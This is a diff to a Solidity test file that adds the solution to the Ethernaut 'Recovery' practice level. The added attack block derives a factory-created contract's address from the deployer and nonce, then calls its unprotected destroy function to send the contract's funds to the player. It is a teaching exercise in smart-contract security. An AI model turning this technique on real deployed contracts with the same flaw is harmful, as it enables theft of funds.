@@ -1,6 +1,7 @@
 pragma solidity ^0.8.10;
 
 import "ds-test/test.sol";
+import "../Recovery/Recovery.sol";
 import "../Recovery/RecoveryFactory.sol";
 import "../Ethernaut.sol";
 import "./utils/vm.sol";
@@ -31,6 +32,10 @@ contract RecoveryTest is DSTest {
         //////////////////
         // LEVEL ATTACK //
         //////////////////
+        address lostAddress = address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), levelAddress, bytes1(0x01))))));
+        bytes memory data = abi.encodeWithSelector(SimpleToken.destroy.selector, eoaAddress);
+        (bool success, ) = lostAddress.call(data);
+        assertTrue(success, "Transaction failed");
 
         //////////////////////
         // LEVEL SUBMISSION //
